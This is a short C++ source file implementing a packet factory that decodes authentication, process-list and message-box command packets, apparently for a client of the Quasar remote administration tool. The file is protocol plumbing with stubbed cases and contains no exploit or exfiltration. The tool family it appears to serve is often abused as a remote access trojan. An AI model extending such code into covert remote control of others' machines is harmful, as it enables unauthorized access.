#include "stdafx.h"
#include "packet_factory.h"
#include <membuf.h>
#include <istream>
#include <boost/make_shared.hpp>
#include <primitives.h>

using namespace std;

boost::shared_ptr<quasar_packet> packet_factory::create_packet(vector<char> &payload) {
	basic_array_source<char> input_source(&payload[0], payload.size());

	boost::shared_ptr<quasar_packet> packet;
	memstream stream(input_source);
	char packetId = primitives::read_varint32(stream);

	switch (static_cast<QuasarPacketId>(packetId)) {
	case PACKET_GET_AUTHENTICATION:
		packet = boost::dynamic_pointer_cast<quasar_packet>(
			boost::make_shared<get_authentication_packet>());
		break;
	case PACKET_GET_AUTHENTICATION_RESPONSE: 
		packet = boost::dynamic_pointer_cast<quasar_packet>(
			boost::make_shared<get_authentication_response_packet>());
		break;
	case PACKET_UNKNOWN:
		break;
	default: break;
	case PACKET_GET_PROCESSES: break;
	case PACKET_GET_PROCESSES_RESPONSE: break;
	case PACKET_DO_SHOW_MESSAGEBOX: 
		packet = boost::dynamic_pointer_cast<quasar_packet>(
			boost::make_shared<do_show_message_box_packet>());
		break;
	}

	// can be null because of dynamic ptr cast
	if (packet != nullptr) {
		packet->deserialize_packet(stream);
	}
	return packet;
}
